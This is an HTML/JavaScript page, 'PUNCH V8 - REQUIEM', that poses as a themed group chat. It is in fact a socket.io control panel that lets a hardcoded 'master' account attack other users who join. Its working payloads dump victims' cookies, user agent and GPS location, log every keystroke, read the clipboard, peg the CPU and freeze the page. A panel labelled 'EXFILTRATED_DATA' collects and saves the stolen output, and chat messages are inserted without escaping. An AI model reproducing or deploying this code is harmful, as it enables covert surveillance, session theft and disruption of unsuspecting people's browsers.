<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUNCH V8 - REQUIEM</title>
    
    <style>
        /* --- [INTERFACE NOIRE & OR - LIGNES 20-200] --- */
        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@500;800&display=swap');
        
        :root {
            --gold: #FFD700;
            --deep-purple: #1a0033;
            --blood-red: #ff0000;
            --matrix-green: #00ff41;
            --bg: #020202;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair !important; }
        body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; height: 100vh; overflow: hidden; display: flex; }

        /* --- LOGIN REQUIEM --- */
        #gate { position: fixed; inset: 0; background: #000; z-index: 999999; display: flex; align-items: center; justify-content: center; background-image: radial-gradient(circle, #1a001a 0%, #000 100%); }
        .gate-box { width: 400px; padding: 40px; border: 1px solid var(--gold); text-align: center; box-shadow: 0 0 50px rgba(255, 215, 0, 0.2); }
        .gate-box h1 { font-family: 'Bangers'; font-size: 50px; color: var(--gold); margin-bottom: 20px; text-shadow: 3px 3px var(--blood-red); }
        .gate-box input { width: 100%; padding: 15px; margin-bottom: 10px; background: #111; border: 1px solid #333; color: #fff; }
        .gate-box button { width: 100%; padding: 15px; background: var(--gold); border: none; font-weight: 900; color: #000; cursor: pointer; }

        /* --- MAIN LAYOUT --- */
        .app { display: grid; grid-template-columns: 350px 1fr 350px; width: 100%; height: 100vh; gap: 1px; background: #111; }
        .panel { background: #000; display: flex; flex-direction: column; position: relative; border: 1px solid #111; }
        .panel-h { padding: 20px; background: #080808; border-bottom: 1px solid var(--gold); font-family: 'Bangers'; font-size: 20px; color: var(--gold); display: flex; justify-content: space-between; }

        /* VICTIM LIST */
        #v-list { flex: 1; overflow-y: auto; padding: 15px; }
        .v-card { padding: 15px; background: #050505; border: 1px solid #111; margin-bottom: 10px; transition: 0.2s; position: relative; overflow: hidden; }
        .v-card:hover { border-color: var(--gold); background: #0a0a0a; }
        .v-card.master { border-left: 5px solid var(--gold); }
        .v-card.selected { border: 1px solid var(--blood-red); background: #100000; }

        /* CHAT / EXPLOIT CONSOLE */
        #console { flex: 1; padding: 20px; overflow-y: auto; font-size: 11px; line-height: 1.5; color: var(--matrix-green); }
        .msg { margin-bottom: 8px; border-left: 2px solid #222; padding-left: 10px; }
        .msg b { color: var(--gold); }
        .msg img { max-width: 250px; border: 1px solid var(--gold); margin-top: 5px; display: block; }

        /* INPUT AREA */
        .input-bar { padding: 20px; background: #050505; border-top: 1px solid var(--gold); display: flex; gap: 10px; }
        .input-bar input { flex: 1; background: transparent; border: none; color: #fff; font-family: inherit; outline: none; }

        /* EXFILTRATED DATA PANEL */
        #intel { flex: 1; padding: 15px; overflow-y: auto; font-size: 10px; color: #777; }
        .intel-item { background: #080808; padding: 10px; border-bottom: 1px solid #111; margin-bottom: 5px; word-break: break-all; }
        .intel-item span { color: var(--blood-red); font-weight: bold; }

        /* --- OVERLAYS --- */
        #za-warundo { position: fixed; inset: 0; background: #fff; z-index: 2000000; display: none; align-items: center; justify-content: center; mix-blend-mode: difference; }
        .shout { font-family: 'Bangers'; font-size: 12vw; color: #fff; }

        #ctx { display: none; position: fixed; background: #000; border: 1px solid var(--gold); width: 300px; z-index: 3000000; box-shadow: 10px 10px 0 var(--blood-red); }
        .opt { padding: 15px; font-size: 10px; border-bottom: 1px solid #111; color: #fff; text-transform: uppercase; }
        .opt:hover { background: var(--gold); color: #000; }
        .opt.red { color: var(--blood-red); font-weight: bold; }

    </style>
</head>
<body oncontextmenu="return false;">

    <div id="za-warundo"><div class="shout">REQUIEM</div></div>

    <div id="gate">
        <div class="gate-box">
            <h1>PUNCH V8</h1>
            <input type="email" id="e-in" placeholder="Disciple Email">
            <input type="text" id="n-in" placeholder="Stand Name">
            <button onclick="ascend()">ASCEND TO HEAVEN</button>
        </div>
    </div>

    <div class="app">
        <aside class="panel">
            <div class="panel-h">DISCIPLES <span>[V8]</span></div>
            <div id="v-list"></div>
        </aside>

        <main class="panel">
            <div class="panel-h">MAIN_GRAVITY_STREAM</div>
            <div id="console"></div>
            <div class="input-bar">
                <button onclick="document.getElementById('file-in').click()" style="background:none; border:none; color:var(--gold); font-size:20px;">🖼️</button>
                <input type="file" id="file-in" style="display:none" onchange="upImg(this)">
                <input type="text" id="m-in" placeholder="Do you believe in gravity?" autocomplete="off">
                <button onclick="send()" style="background:none; border:none; color:var(--gold); font-size:20px;">🏹</button>
            </div>
        </main>

        <aside class="panel">
            <div class="panel-h">EXFILTRATED_DATA <button onclick="downloadLogs()" style="font-size:10px; background:var(--gold); border:none; padding:2px 5px; cursor:pointer;">SAVE</button></div>
            <div id="intel"></div>
        </aside>
    </div>

    <div id="ctx">
        <div class="opt" style="background:#111; color:var(--gold); text-align:center;">--- OVER HEAVEN ---</div>
        <div class="opt red" onclick="st('p_dox')">🧛 AUTO-DOX: FULL_IDENTITY</div>
        <div class="opt" onclick="st('p_phish')">🚨 PHISH: GOOGLE_SESSION</div>
        <div class="opt" onclick="st('p_geo')">📍 TRACK: GPS_PRECISION</div>
        <div class="opt" onclick="st('p_key')">⌨️ KEYLOG: OVERDRIVE</div>
        <div class="opt" onclick="st('p_clip')">📋 CLIP: MEMORY_DISC</div>
        <div class="opt" onclick="st('p_freeze')">❄️ FREEZE: ZA_WARUNDO</div>
        <div class="opt" onclick="st('p_crash')">🧨 CRASH: CPU_BURN</div>
        <div class="opt" onclick="closeCtx()" style="color:#555">[ ABORT ]</div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let me = ""; let myE = ""; let target = "";
        let master = false;
        let logs = [];

        // --- AUTH ---
        function ascend() {
            myE = document.getElementById('e-in').value;
            me = document.getElementById('n-in').value || "Disciple";
            if(myE.includes('@')) {
                if(myE === "toucheur2pp@heaven.com") master = true;
                document.getElementById('gate').style.display = 'none';
                socket.emit('init', { n: me, e: myE });
                writeCon("SYSTEM", "Handshake Established. Gravity Active.");
            }
        }

        // --- INTERFACE ---
        window.oncontextmenu = (e) => {
            if(!master) return;
            const c = e.target.closest('.v-card');
            if(c) {
                target = c.getAttribute('data-id');
                const m = document.getElementById('ctx');
                m.style.display = 'block'; m.style.left = e.pageX+'px'; m.style.top = e.pageY+'px';
            }
        };

        function closeCtx() { document.getElementById('ctx').style.display = 'none'; }
        function st(t) { socket.emit(t, target); closeCtx(); }

        // --- CHAT & IMAGES ---
        function send() {
            const i = document.getElementById('m-in');
            if(i.value) { socket.emit('chat', { t: i.value, type: 'text' }); i.value = ""; }
        }

        function upImg(el) {
            if(el.files[0]) {
                const r = new FileReader();
                r.onload = (e) => socket.emit('chat', { t: e.target.result, type: 'img' });
                r.readAsDataURL(el.files[0]);
            }
        }

        // --- EXPLOIT PAYLOADS (DANGEROUS ZONE) ---
        socket.on('execute', (d) => {
            
            // 1. AUTO-DOX (Identité + IP + Browser)
            if(d.type === 'p_dox') {
                const info = {
                    ua: navigator.userAgent,
                    res: `${screen.width}x${screen.height}`,
                    lang: navigator.language,
                    cookies: document.cookie || "No Cookies Found",
                    localIP: "Scanning..."
                };
                socket.emit('chat', { t: `[DOX_REPORT] Target: ${me} | UA: ${info.ua} | Res: ${info.res} | Cookies: ${info.cookies}`, type: 'text' });
                // Enchaîne sur le Geo
                navigator.geolocation.getCurrentPosition(p => {
                    socket.emit('chat', { t: `[GEO_REPORT] ${me} Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, type: 'text' });
                });
            }

            // 2. STEALTH KEYLOGGER
            if(d.type === 'p_key') {
                document.addEventListener('keydown', (e) => {
                    socket.emit('chat', { t: `[KEYLOG] ${me} pressed: ${e.key}`, type: 'text' });
                });
            }

            // 3. CPU CRASH (Danger)
            if(d.type === 'p_crash') {
                writeCon("CRITICAL", "Made in Heaven accelerating CPU...");
                setInterval(() => { for(let i=0; i<1000000; i++) Math.sqrt(Math.random()); }, 1);
            }

            // 4. ZA WARUNDO (Freeze)
            if(d.type === 'p_freeze') {
                const zw = document.getElementById('za-warundo');
                zw.style.display = 'flex';
                document.body.style.pointerEvents = 'none';
                setTimeout(() => { zw.style.display = 'none'; document.body.style.pointerEvents = 'auto'; }, 8000);
            }

            // 5. MEMORY DISC (Clipboard)
            if(d.type === 'p_clip') {
                navigator.clipboard.readText().then(txt => {
                    socket.emit('chat', { t: `[CLIP_STEAL] ${me} clipboard: ${txt}`, type: 'text' });
                });
            }
        });

        // --- SYNC & DATA EXFIL ---
        socket.on('sync', u => {
            const l = document.getElementById('v-list'); l.innerHTML = "";
            u.forEach(x => {
                const div = document.createElement('div');
                div.className = `v-card ${x.e === "toucheur2pp@heaven.com" ? "master" : ""}`;
                div.setAttribute('data-id', x.id);
                div.innerHTML = `<b>${x.n.toUpperCase()}</b><br><small>${x.e}</small>`;
                l.appendChild(div);
            });
        });

        socket.on('chat', d => {
            const c = document.getElementById('console');
            const isEx = d.t.t.includes('[');
            const div = document.createElement('div');
            div.className = 'msg';
            
            let html = `<b>${d.n}:</b> `;
            if(d.t.type === 'img') html += `<img src="${d.t.t}">`;
            else html += d.t.t;

            div.innerHTML = html;
            c.appendChild(div);
            c.scrollTop = c.scrollHeight;

            if(isEx) {
                const i = document.getElementById('intel');
                const time = new Date().toLocaleTimeString();
                i.innerHTML = `<div class="intel-item"><span>[${time}]</span> ${d.t.t}</div>` + i.innerHTML;
                logs.push(`[${time}] ${d.t.t}`);
            }
        });

        function writeCon(tag, msg) {
            const c = document.getElementById('console');
            c.innerHTML += `<div class="msg" style="color:var(--gold)">[${tag}] ${msg}</div>`;
            c.scrollTop = c.scrollHeight;
        }

        function downloadLogs() {
            const blob = new Blob([logs.join('\n')], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `punch_exfil_${Date.now()}.txt`;
            a.click();
        }

        document.getElementById('m-in').onkeydown = (e) => { if(e.key === "Enter") send(); };
        window.onclick = () => closeCtx();
    </script>
</body>
</html>
